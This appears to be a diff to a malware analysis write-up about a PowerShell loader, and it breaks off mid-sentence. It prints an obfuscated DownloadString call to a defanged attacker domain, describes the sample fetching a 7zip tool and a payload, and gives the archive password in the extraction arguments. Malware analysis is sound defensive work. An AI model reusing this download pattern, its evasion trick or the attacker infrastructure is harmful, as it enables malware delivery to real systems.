@@ -266,4 +266,8 @@ $ackURL = 'hxxp[:]//svs-verificationdate[.]beer/70da0d18d8f8eebf?ack=1'
 $downloadString = 'Downl' + 'oadString'
 try { [void]$wc.$downloadString($ackURL) }catch {}
 ```
-This one performs a similar function, it creates two new temporary files with `.exe` and `.zip` respectively. It then tries 3 times to download a "7zip" file from the domain, and then the malware payload from the domain. The secondary tempfile is created 
+This one performs a similar function, it creates two new temporary files with `.exe` and `.zip` respectively. It then tries 3 times to download a "7zip" file from the domain, and then the malware payload from the domain. The secondary tempfile is created in the temp directory, and then the `$xyArray` is given the value of
+`@('x','-y','-pxmq92ixDm','-oC:\C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0','C:\C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0.zip')`
+
+From there 
+
